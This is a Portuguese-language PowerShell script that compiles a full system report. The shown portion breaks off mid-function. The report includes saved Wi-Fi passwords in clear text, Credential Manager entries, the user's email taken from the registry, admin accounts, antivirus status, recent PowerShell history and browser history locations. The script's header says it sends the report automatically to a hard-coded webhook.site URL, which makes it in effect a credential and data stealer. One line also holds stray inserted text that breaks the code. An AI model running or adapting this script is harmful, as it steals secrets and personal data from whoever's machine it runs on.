<#
    exporta-wifi-const.ps1

    Versão modificada:
      - Não usa parâmetros
      - A URL do webhook é definida como constante (variável no topo) e deve ser editada antes do uso
      - Ao executar o script ele gera o arquivo e envia para o webhook (se $WebhookUrl estiver preenchida)

    ATENÇÃO: use apenas em máquinas ou ambientes com autorização.
#>

# === CONFIGURAÇÕES (edite aqui antes de executar) ===

# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
$OutputFileDefault = Join-Path $env:TEMP 'wifi_passwords.txt'
# ====================================================




function Get-SystemInfo {
    <#
    .SYNOPSIS
        Coleta informações completas do sistema, rede, hardware e segurança.
    .DESCRIPTION
        Usa exclusivamente recursos nativos do Windows (PowerShell cmdlets, WMI/CIM, netsh, etc.)
        para reunir um relatório abrangente do computador.
    .PARAMETER OutputFile
        Caminho do arquivo onde o relatório será salvo. Padrão: $OutputFileDefault
    .PARAMETER ExportDir
        Diretório de exportação para arquivos temporários. Padrão: $ExportDirDefault
    .EXAMPLE
        Get-SystemInfo
        Get-SystemInfo -OutputFile "$env:TEMP\system_info.txt"
        Get-SystemInfo -OutputFile "$ExportDirDefault\system_info.txt" -ExportDir $ExportDirDefault
    #>
    [CmdletBinding()]
    param(
        [string]$OutputFile = $OutputFileDefault,
        [string]$ExportDir = $ExportDirDefault
    )

    $sb = [System.Text.StringBuilder]::new()
    $sep = ("=" * 70)
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'

    # --- Helper ---
    $null = $sb.AppendLine($sep)
    $null = $sb.AppendLine("RELATÓRIO COMPLETO DO SISTEMA")
    $null = $sb.AppendLine("Coletado em: $timestamp")
    $null = $sb.AppendLine($sep)
    $null = $sb.AppendLine("")

    # ===========================
    # 1. IDENTIFICAÇÃO DO USUÁRIO
    # ===========================
    $null = $sb.AppendLine("## 1. IDENTIFICAÇÃO DO USUÁRIO")
    $null = $sb.AppendLine("-" * 70)
    $null = $sb.AppendLine("Usuário Logado       : $env:USERNAME")
    $null = $sb.AppendLine("Domínio              : $env:USERDOMAIN")
    $null = $sb.AppendLine("Domínio DNS          : $env:USERDNSDOMAIN")
    $null = $sb.AppendLine("Nome Completo (env)  : $env:FULLNAME")
    $null = $sb.AppendLine("Perfil Path          : $env:USERPROFILE")
    $null = $sb.AppendLine("Computador           : $env:COMPUTERNAME")

    # Email (Múltiplas tentativas)
    $email = "[não disponível]"
    try {
        $regEmail = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\*\Outlook\Profiles\*' -Name 'Account Name' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty 'Account Name' -ErrorAction SilentlyContinue
        if ($regEmail) { $email = $regEmail }
    } catch { }
    if ($email -eq "[não disponível]") {
        try {
            $regEmail = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\*\Outlook\v3\Client.Data' -ErrorAction SilentlyContinue).'User Information.Email'
            if ($regEmail) { $email = $regEmail }
        } catch { }
    }
    if ($email -eq "[não disponível]") {
        try {
            $regEmail = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles*' -ErrorAction SilentlyContinue).'Email'
            if ($regEmail) { $email = $regEmail }
        } catch { }
    }
    if ($email -eq "[não disponível]") {
        try {
            $regEmail = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\IdentityCRL' -ErrorAction SilentlyContinue).'StoredUserName'
            if ($regEmail) { $email = $regEmail }
        } catch { }
    }
    if ($email -eq "[não disponível]") {
        try {
            $regEmail = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction SilentlyContinue).'User Agent'
            if ($regEmail -and $regEmail -match '<[^>]+@[^>]+>') { $email = $Matches[0] -replace '[<>]' }
        } catch { }
    }
    # Verificar OneDrive / Microsoft Account
    if ($email -eq "[não disponível]") {
        try {
            $userToken = Get-ChildItem -Path 'HKCU:\Software\Microsoft\IdentityStore\Accounts' -ErrorAction SilentlyContinue | ForEach-Object {
                try { return (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue) } catch { }
            } | Where-Object { $_.DisplayableId -match '@' } | Select-Object -First 1
            if ($userToken) { $email = $userToken.DisplayableId }
        } catch { }
    }
    $null = $sb.AppendLine("Email                : $email")

    # ===========================
    # 2. INFORMAÇÕES DO SISTEMA / OS
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("## 2. INFORMAÇÕES DO SISTEMA OPERACIONAL")
    $null = $sb.AppendLine("-" * 70)
    try {
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($os) {
            $null = $sb.AppendLine("Sistema Operacional  : $($os.Caption)")
            $null = $sb.AppendLine("Versão               : $($os.Version)")
            $null = $sb.AppendLine("Build   since="2024-01-01",since="2024-01-01",             : $($os.BuildNumber)")
            $null = $sb.AppendLine("Build Type           : $($os.OperatingSystemSKU)")
            $null = $sb.AppendLine("Arquitetura          : $($os.OSArchitecture)")
            $null = $sb.AppendLine("Idioma               : $($os.MUILanguages -join ', ')")
            $null = $sb.AppendLine("Data Instalação      : $($os.InstallDate)")
            $null = $sb.AppendLine("Último Boot          : $($os.LastBootUpTime)")
            $null = $sb.AppendLine("Tempo Ativo (dias)   : $([math]::Round(((Get-Date) - $os.LastBootUpTime).TotalDays, 1))")
            $null = $sb.AppendLine("Tipo de Registro     : $($os.ProductType)")
            $null = $sb.AppendLine("Registered User      : $($os.RegisteredUser)")
            $null = $sb.AppendLine("Windows Directory    : $($os.WindowsDirectory)")
        }
    } catch { $null = $sb.AppendLine("Erro ao obter informações do OS.") }

    try {
        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($cs) {
            $null = $sb.AppendLine("Fabricante           : $($cs.Manufacturer)")
            $null = $sb.AppendLine("Modelo               : $($cs.Model)")
            $null = $sb.AppendLine("SMBIOS Version       : $($cs.SMBIOSBIOSVersion)")
            $null = $sb.AppendLine("Sistema Tipo         : $($cs.SystemType)")
            $null = $sb.AppendLine("Physical Memory      : $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2)) GB")
        }
    } catch { }

    try {
        $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
        if ($bios) {
            $null = $sb.AppendLine("BIOS/UEFI            : $($bios.Name) v$($bios.SMBIOSBIOSVersion)")
            $null = $sb.AppendLine("BIOS Manufacturer    : $($bios.Manufacturer)")
            $null = $sb.AppendLine("BIOS Release Date    : $($bios.ReleaseDate)")
        }
    } catch { }

    # ===========================
    # 3. INFORMAÇÕES DE HARDWARE
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("## 3. INFORMAÇÕES DE HARDWARE")
    $null = $sb.AppendLine("-" * 70)

    # CPU
    try {
        $cpu = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cpu) {
            $null = $sb.AppendLine("CPU                  : $($cpu.Name)")
            $null = $sb.AppendLine("Cores                : $($cpu.NumberOfCores)")
            $null = $sb.AppendLine("Threads (Lógicos)    : $($cpu.NumberOfLogicalProcessors)")
            $null = $sb.AppendLine("Clock Base           : $($cpu.MaxClockSpeed) MHz")
            $null = $sb.AppendLine("Clock Atual          : $($cpu.CurrentClockSpeed) MHz")
            $null = $sb.AppendLine("Cache L2             : $([math]::Round($cpu.L2CacheSize / 1KB, 0)) KB")
            $null = $sb.AppendLine("Cache L3             : $([math]::Round($cpu.L3CacheSize / 1KB, 0)) KB")
        }
    } catch { }

    # RAM
    try {
        $ram = Get-CimInstance -ClassName Win32_PhysicalMemory -ErrorAction SilentlyContinue
        if ($ram) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  MEMÓRIA RAM:")
            foreach ($m in $ram) {
                $null = $sb.AppendLine("    - $([math]::Round($m.Capacity / 1GB, 1)) GB | Speed: $($m.Speed) MHz | Manufacturer: $($m.Manufacturer) | Part: $($m.PartNumber)")
            }
        }
    } catch { }

    # Disco
    try {
        $disks = Get-CimInstance -ClassName Win32_DiskDrive -ErrorAction SilentlyContinue
        if ($disks) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  DISCOS RIGIDOS:")
            foreach ($d in $disks) {
                $null = $sb.AppendLine("    - $($d.Model) | $([math]::Round($d.Size / 1GB, 0)) GB | Interface: $($d.InterfaceType) | Serial: $($d.SerialNumber)")
            }
        }
    } catch { }

    # Partições
    try {
        $partitions = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
        if ($partitions) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  PARTIÇÕES / VOLUMES:")
            foreach ($p in $partitions) {
                $totalGB = [math]::Round($p.Size / 1GB, 2)
                $freeGB = [math]::Round(($p.Size - $p.FreeSpace) / 1GB, 2)
                $freePct = [math]::Round(($p.FreeSpace / $p.Size) * 100, 1)
                $null = $sb.AppendLine("    - $($p.DeviceID) | FS: $($p.FileSystem) | Total: ${totalGB}GB | Usado: ${freeGB}GB | Livre: ${freePct}%")
            }
        }
    } catch { }

    # GPU
    try {
        $gpus = Get-CimInstance -ClassName Win32_VideoController -ErrorAction SilentlyContinue
        if ($gpus) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  PLACA DE VÍDEO (GPU):")
            foreach ($g in $gpus) {
                $null = $sb.AppendLine("    - $($g.Name)")
                $null = $sb.AppendLine("      Driver Version: $($g.DriverVersion) | Date: $($g.DriverDate)")
                $null = $sb.AppendLine("      VRAM: $([math]::Round($g.AdapterRAM / 1GB, 1)) GB | Resolution: $($g.CurrentHorizontalResolution)x$($g.CurrentVerticalResolution) | $($g.ColorDepth)bit")
            }
        }
    } catch { }

    # Placa Mãe
    try {
        $mb = Get-CimInstance -ClassName Win32_BaseBoard -ErrorAction SilentlyContinue
        if ($mb) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  PLACA MÃE")
            $null = $sb.AppendLine("    Fabricante: $($mb.Manufacturer)")
            $null = $sb.AppendLine("    Modelo    : $($mb.Product)")
            $null = $sb.AppendLine("    Serial    : $($mb.SerialNumber)")
        }
    } catch { }

    # Dispositivos USB
    try {
        $usbDevices = Get-CimInstance -ClassName Win32_USBControllerDevice -ErrorAction SilentlyContinue | ForEach-Object {
            $deviceName = [regex]::Match($_.Dependent, 'Name="([^"]+)"').Groups[1].Value
            if ($deviceName) { $deviceName }
        } | Select-Object -Unique
        if ($usbDevices) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  DISPOSITIVOS USB CONECTADOS:")
            foreach ($u in ($usbDevices | Select-Object -First 20)) {
                $null = $sb.AppendLine("    - $u")
            }
            if ($usbDevices.Count -gt 20) {
                $null = $sb.AppendLine("    ... e mais $($usbDevices.Count - 20) dispositivos")
            }
        }
    } catch { }

    # Bateria (portátil)
    try {
        $battery = Get-CimInstance -ClassName Win32_Battery -ErrorAction SilentlyContinue
        if ($battery) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  BATERIA (Notebook):")
            foreach ($b in $battery) {
                $null = $sb.AppendLine("    Nome: $($b.Name)")
                $null = $sb.AppendLine("    Status: $($b.BatteryStatus)")
                $null = $sb.AppendLine("    Capacidade: $([math]::Round($b.DesignCapacity / 1000, 0)) mWh")
                $null = $sb.AppendLine("    Charge Atual: $([math]::Round($b.CurrentCapacity / 1000, 0)) mWh")
            }
        }
    } catch { }

    # ===========================
    # 4. INFORMAÇÕES DE REDE
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("## 4. INFORMAÇÕES DE REDE")
    $null = $sb.AppendLine("-" * 70)

    # IP Global
    $globalIp = "[não disponível]"
    try {
        $globalIp = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content
    } catch {
        try {
            $globalIp = (Invoke-WebRequest -Uri 'https://ifconfig.me' -UseBasicParsing -TimeoutSec 5).Content.Trim()
        } catch {
            try {
                $globalIp = (Invoke-WebRequest -Uri 'https://icanhazip.com' -UseBasicParsing -TimeoutSec 5).Content.Trim()
            } catch {
                try {
                    $globalIp = (Invoke-WebRequest -Uri 'https://checkip.amazonaws.com' -UseBasicParsing -TimeoutSec 5).Content.Trim()
                } catch { $globalIp = "[indisponível - sem acesso externo]" }
            }
        }
    }
    $null = $sb.AppendLine("IP Global (Externo)  : $globalIp")

    # Endereço MAC do adaptador padrão
    try {
        $defaultRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -AddressFamily IPv4 -ErrorAction SilentlyContinue | Sort-Object RouteMetric | Select-Object -First 1
        if ($defaultRoute) {
            $ipCfg = Get-NetIPConfiguration -InterfaceIndex $defaultRoute.InterfaceIndex -ErrorAction SilentlyContinue
            if ($ipCfg) {
                $null = $sb.AppendLine("MAC (Adaptador Ativo): $($ipCfg.MacAddress)")
                $null = $sb.AppendLine("Descrição Adapter    : $($ipCfg.InterfaceDescription)")
                $null = $sb.AppendLine("Adapter Alias        : $($ipCfg.InterfaceAlias)")
            }
        }
    } catch { }

    # Tipo de conexão
    $connType = "[não disponível]"
    try {
        $wifiAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN' }
        if ($wifiAdapters) {
            $wlanInfo = & netsh wlan show interfaces 2>$null
            if ($wlanInfo) {
                $wlanState = $wlanInfo | Select-String '^\s*State\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
                if ($wlanState) {
                    if ($wlanState -eq 'connected') { $connType = "Wi-Fi (Conectado)" }
                    else { $connType = "Wi-Fi (Desconectado)" }
                } else { $connType = "Wi-Fi" }
            } else { $connType = "Wi-Fi" }
        }
    } catch { }

    if ($connType -eq "[não disponível]") {
        try {
            $ethAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceDescription -match 'Ethernet|LAN|Gigabit' -and $_.Status -eq 'Up' }
            if ($ethAdapters) { $connType = "Cabo Ethernet (Conectado)" }
            else { $connType = "Cabo Ethernet (Desconectado)" }
        } catch { $connType = "[não disponível]" }
    }
    $null = $sb.AppendLine("Tipo de Conexão      : $connType")

    # IP Local e detalhes
    try {
        $ipConfigs = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                     Where-Object { $_.IPAddress -notlike "169.*" -and $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne 'WellKnown' }
        if ($ipConfigs) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  ENDEREÇOS IP LOCAIS:")
            foreach ($ic in $ipConfigs) {
                $ipCfg = Get-NetIPConfiguration -InterfaceIndex $ic.InterfaceIndex -ErrorAction SilentlyContinue
                $null = $sb.AppendLine("    - $($ic.IPAddress) | Adapter: $($ipCfg.InterfaceAlias) | Prefix: $($ic.PrefixLength) | DHCP: $($ic.Dhcpv4Enabled)")
            }
        }
    } catch { }

    # Gateway e DNS
    try {
        $gateways = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPv4DefaultGateway -ne $null }
        if ($gateways) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  GATEWAYS E DNS:")
            foreach ($g in $gateways) {
                $gw = $g.IPv4DefaultGateway.NextHop
                $dns = ($g.DnsServer -join ', ') -or "[nenhum]"
                $null = $sb.AppendLine("    - Adapter: $($g.InterfaceAlias) | Gateway: $gw | DNS: $dns")
            }
        }
    } catch { }

    # Tabela ARP
    try {
        $arpTable = Get-NetNeighbor -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Unreachable' }
        if ($arpTable) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  TABELA ARP (Dispositivos na Rede Local):")
            foreach ($a in ($arpTable | Select-Object -First 30)) {
                $null = $sb.AppendLine("    - $($a.IPAddress) | MAC: $($a.MacAddress) | State: $($a.State) | Adapter: $($a.InterfaceAlias)")
            }
            if ($arpTable.Count -gt 30) {
                $null = $sb.AppendLine("    ... e mais $($arpTable.Count - 30) entradas")
            }
        }
    } catch { }

    # WiFi Salvo
    try {
        $wifiProfiles = & netsh wlan show profiles 2>$null
        if ($wifiProfiles) {
            $ssidList = $wifiProfiles | Select-String '^\s*All User Profile\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
            if ($ssidList) {
                $null = $sb.AppendLine("")
                $null = $sb.AppendLine("  REDES WIFI SALVAS:")
                foreach ($s in $ssidList) {
                    $null = $sb.AppendLine("    - $s")
                }
            }
        }
    } catch { }

    # WiFi Senhas (se permitido)
    try {
        $wifiProfiles = & netsh wlan show profiles 2>$null
        if ($wifiProfiles) {
            $ssidList = $wifiProfiles | Select-String '^\s*All User Profile\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
            if ($ssidList) {
                $null = $sb.AppendLine("")
                $null = $sb.AppendLine("  SENHAS WIFI SALVAS:")
                foreach ($ssid in ($ssidList | Select-Object -First 50)) {
                    try {
                        $wifiDetail = & netsh wlan show profiles name="$ssid" key=clear 2>$null
                        $pwdMatch = $wifiDetail | Select-String '^\s*Key Content\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
                        $securityMatch = $wifiDetail | Select-String '^\s*Security key\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
                        $pwd = $pwdMatch -or '[sem senha]'
                        $sec = $securityMatch -or 'Desconhecido'
                        $null = $sb.AppendLine("    - SSID: $ssid | Senha: $pwd | Segurança: $sec")
                    } catch { }
                }
            }
        }
    } catch { }

    # Configuração DHCP
    try {
        $dhcpConfigs = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPv4DHCPEnabled -eq $true }
        if ($dhcpConfigs) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  CONFIGURAÇÃO DHCP:")
            foreach ($d in $dhcpConfigs) {
                $null = $sb.AppendLine("    - Adapter: $($d.InterfaceAlias) | DHCP: Habilitado | Lease: $($d.DnsSuffix)")
            }
        }
    } catch { }

    # ===========================
    # 5. INFORMAÇÕES DE SEGURANÇA
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("## 5. INFORMAÇÕES DE SEGURANÇA")
    $null = $sb.AppendLine("-" * 70)

    # Firewall
    $fwStatus = "[não disponível]"
    $fwProfile = ""
    try {
        $fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue
        if ($fw) {
            $fwProfiles = @()
            foreach ($p in @('Domain', 'Private', 'Public')) {
                $val = $fw.$p
                if ($val) {
                    $fwProfiles += "$p: $(if ($val.Enabled) { 'ATIVADO' } else { 'DESATIVADO' })"
                }
            }
            $fwStatus = ($fwProfiles -join ', ')
        }
    } catch { }
    $null = $sb.AppendLine("Windows Firewall     : $fwStatus")

    # Defender / Antivirus
    try {
        $defender = Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%Defender%'" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($defender) {
            $null = $sb.AppendLine("Windows Defender     : Instalado (v$($defender.Version))")
        } else {
            $null = $sb.AppendLine("Windows Defender     : [verificar manualmente]")
        }
    } catch { }

    # Antivirus via WMI (mais confiável)
    try {
        $antivirus = Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntivirusProduct -ErrorAction SilentlyContinue
        if ($antivirus) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  ANTIVIRUS ATIVO:")
            foreach ($a in $antivirus) {
                $null = $sb.AppendLine("    - $($a.DisplayName)")
                $null = $sb.AppendLine("      Path: $($a.PathToSignedProductExe)")
                $null = $sb.AppendLine("      Status: $($a.productState)")
            }
        }
    } catch { }

    # Windows Update
    try {
        $updateSession = New-Object -ComObject Microsoft.Update.Session -ErrorAction SilentlyContinue
        if ($updateSession) {
            $updateSearcher = $updateSession.CreateUpdateSearcher()
            $lastSearch = $updateSearcher.LastSearchSuccessDate
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  ATUALIZAÇÕES WINDOWS")
            $null = $sb.AppendLine("    Última Busca Bem-sucedida: $lastSearch")

            $updates = $updateSession.CreateUpdateSearcher().Search("IsInstalled=0").Updates
            if ($updates.Count -gt 0) {
                $null = $sb.AppendLine("    Atualizações Pendentes: $($updates.Count)")
                foreach ($u in ($updates | Select-Object -First 10)) {
                    $null = $sb.AppendLine("      - $($u.Title)")
                }
            } else {
                $null = $sb.AppendLine("    Atualizações Pendentes: Nenhuma")
            }
        }
    } catch { $null = $sb.AppendLine("  Não foi possível verificar atualizações.") }

    # Contas de Usuário Local
    try {
        $localUsers = Get-LocalUser -ErrorAction SilentlyContinue | Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description
        if ($localUsers) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  CONTAS DE USUÁRIO LOCAL:")
            foreach ($u in $localUsers) {
                $pwdExpiry = "[não configurada]"
                try {
                    $pwdExpiry = (Get-LocalUser -Name $u.Name).PasswordLastSet
                } catch { }
                $null = $sb.AppendLine("    - $($u.Name) | Ativo: $(if ($u.Enabled) { 'Sim' } else { 'Não' }) | Último Login: $($u.LastLogon) | Senha alterada: $pwdExpiry")
            }
        }
    } catch { }

    # Contas de Administrador
    try {
        $admins = Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue
        if ($admins) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  GRUPO ADMINISTRADORES:")
            foreach ($a in $admins) {
                $null = $sb.AppendLine("    - $($a.Name) ($($a.ObjectType))")
            }
        }
    } catch { }

    # Compartilhamentos
    try {
        $shares = Get-SmbShare -ErrorAction SilentlyContinue
        if ($shares) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  COMPARTILHAMENTOS DE REDE (SMB):")
            foreach ($s in $shares) {
                $null = $sb.AppendLine("    - $($s.Name) | Path: $($s.Path) | Access: $($s.ShareType)")
            }
        }
    } catch { }

    # Drives Mapeados
    try {
        $mappedDrives = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue | Where-Object { $_.DisplayRoot -ne $null }
        if ($mappedDrives) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  DRIVES MAPEADOS:")
            foreach ($d in $mappedDrives) {
                $null = $sb.AppendLine("    - $($d.Name): -> $($d.DisplayRoot)")
            }
        }
    } catch { }

    # Serviços
    try {
        $services = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' -and $_.StartType -eq 'Automatic' }
        if ($services) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  SERVIÇOS EM EXECUÇÃO (Automáticos):")
            foreach ($sv in ($services | Select-Object -First 30)) {
                $null = $sb.AppendLine("    - $($sv.Name) | $($sv.DisplayName) | Vendor: $($sv.ServiceName)")
            }
            if ($services.Count -gt 30) {
                $null = $sb.AppendLine("    ... e mais $($services.Count - 30) serviços")
            }
        }
    } catch { }

    # Processos
    try {
        $processes = Get-Process -ErrorAction SilentlyContinue | Sort-Object WorkingSet64 -Descending | Select-Object -First 20
        if ($processes) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  TOP 20 PROCESSOS (por uso de memória):")
            foreach ($p in $processes) {
                $null = $sb.AppendLine("    - $($p.ProcessName) (PID: $($p.Id)) | Mem: $([math]::Round($p.WorkingSet64 / 1MB, 1)) MB | CPU: $([math]::Round($p.CPU, 2))s")
            }
        }
    } catch { }

    # Programas Instalados
    try {
        $installedApps = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
                         Where-Object { $_.DisplayName -ne $null } |
                         Select-Object DisplayName, DisplayVersion, InstallDate, Publisher |
                         Sort-Object DisplayName
        if ($installedApps) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  PROGRAMAS INSTALADOS:")
            foreach ($app in ($installedApps | Select-Object -First 50)) {
                $null = $sb.AppendLine("    - $($app.DisplayName) v$($app.DisplayVersion) | $($app.Publisher)")
            }
            if ($installedApps.Count -gt 50) {
                $null = $sb.AppendLine("    ... e mais $($installedApps.Count - 50) programas")
            }
        }
    } catch { }

    # Senhas Salvas (Credential Manager)
    try {
        $creds = cmdkey /list 2>&1
        if ($creds) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  CREDENCIAIS SALVAS (Credential Manager):")
            $credLines = $creds | Select-String 'Target:' | ForEach-Object { $_.Line.Trim() }
            foreach ($cl in $credLines) {
                $null = $sb.AppendLine("    - $cl")
            }
        }
    } catch { }

    # Histórico de Conexões WiFi (netsh wlan show wlanreport)
    try {
        $wlanReportPath = "$env:ProgramData\Microsoft\Windows\WlanReport\wlan-report.xml"
        if (Test-Path -Path $wlanReportPath -ErrorAction SilentlyContinue) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  RELATÓRIO WIFI: $wlanReportPath")
            $fileTime = (Get-Item $wlanReportPath).LastWriteTime
            $null = $sb.AppendLine("    Último Relatório: $fileTime")
        }
    } catch { }

    # ===========================
    # 6. INFORMAÇÕES ADICIONAIS
    # ===========================
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("## 6. INFORMAÇÕES ADICIONAIS")
    $null = $sb.AppendLine("-" * 70)

    # Variáveis de Ambiente Sensíveis
    try {
        $envVars = @('PATH', 'APPDATA', 'PROGRAMDATA', 'SYSTEMDRIVE', 'SYSTEMROOT', 'TEMP', 'TMP', 'USERDOMAIN', 'USERNAME', 'COMPUTERNAME')
        $null = $sb.AppendLine("  VARIÁVEIS DE AMBIENTE:")
        foreach ($ev in $envVars) {
            $val = $env:$ev
            if ($val) {
                $masked = $null
                if ($val.Length -gt 40) {
                    $masked = $val.Substring(0, 20) + '...' + $val.Substring($val.Length - 15)
                } else {
                    $masked = $val
                }
                $null = $sb.AppendLine("    $ev = $masked")
            }
        }
    } catch { }

    # Agendamentos (Tasks)
    try {
        $scheduledTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Ready' -and $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName, TaskPath, State -First 20
        if ($scheduledTasks) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  TAREFAGENDADAS (Terceiros):")
            foreach ($t in $scheduledTasks) {
                $null = $sb.AppendLine("    - $($t.TaskPath)$($t.TaskName) | Estado: $($t.State)")
            }
        }
    } catch { }

    # Rede: Rotas
    try {
        $routes = Get-NetRoute -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.NextHop -ne '0.0.0.0' -and $_.NextHop -ne '255.255.255.255' } | Select-Object DestinationPrefix, NextHop, RouteMetric -First 20
        if ($routes) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  TABELA DE ROTEAMENTO (Selecionado):")
            foreach ($r in $routes) {
                $null = $sb.AppendLine("    - Dest: $($r.DestinationPrefix) | Gateway: $($r.NextHop) | Métrica: $($r.RouteMetric)")
            }
        }
    } catch { }

    # Porta Ouvintes (Listening)
    try {
        $listening = netstat -ano 2>&1 | Select-String 'LISTENING'
        if ($listening) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  PORTAS EM ESCUTA (netstat):")
            foreach ($l in ($listening | Select-Object -First 30)) {
                $null = $sb.AppendLine("    - $($l.Line.Trim())")
            }
            if (($listening | Measure-Object).Count -gt 30) {
                $null = $sb.AppendLine("    ... e mais portass em escuta")
            }
        }
    } catch { }

    # Conexões de Rede Ativas
    try {
        $connections = netstat -ano 2>&1 | Select-String 'ESTABLISHED'
        if ($connections) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  CONEXÕES ESTABELECIDAS (netstat):")
            foreach ($c in ($connections | Select-Object -First 30)) {
                $null = $sb.AppendLine("    - $($c.Line.Trim())")
            }
            if (($connections | Measure-Object).Count -gt 30) {
                $null = $sb.AppendLine("    ... e mais conexões estabelecidas")
            }
        }
    } catch { }

    # Histórico de Comandos (PowerShell)
    try {
        $psHistory = Join-Path $env:APPDATA 'Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
        if (Test-Path -Path $psHistory -ErrorAction SilentlyContinue) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  HISTÓRICO POWERSHELL:")
            $null = $sb.AppendLine("    Arquivo: $psHistory")
            $lines = Get-Content -Path $psHistory -ErrorAction SilentlyContinue | Select-Object -Last 30
            foreach ($h in $lines) {
                $null = $sb.AppendLine("      > $h")
            }
        }
    } catch { }

    # Histórico de Navegador (Chrome/Edge/Firefox)
    try {
        $browserHistories = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
            "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite"
        )
        $foundBrowsers = @()
        foreach ($bh in $browserHistories) {
            $found = Get-ChildItem -Path $bh -ErrorAction SilentlyContinue
            if ($found) {
                $foundBrowsers += $bh
            }
        }
        if ($foundBrowsers) {
            $null = $sb.AppendLine("")
            $null = $sb.AppendLine("  HISTÓRICO DE NAVEGADOR (arquivos encontrados):")
            foreach ($fb in $foundBrowsers) {
                $null = $sb.AppendLine("    - $fb")
            }
        }
    } catch { }

    # Arquivos Recentes
    try {
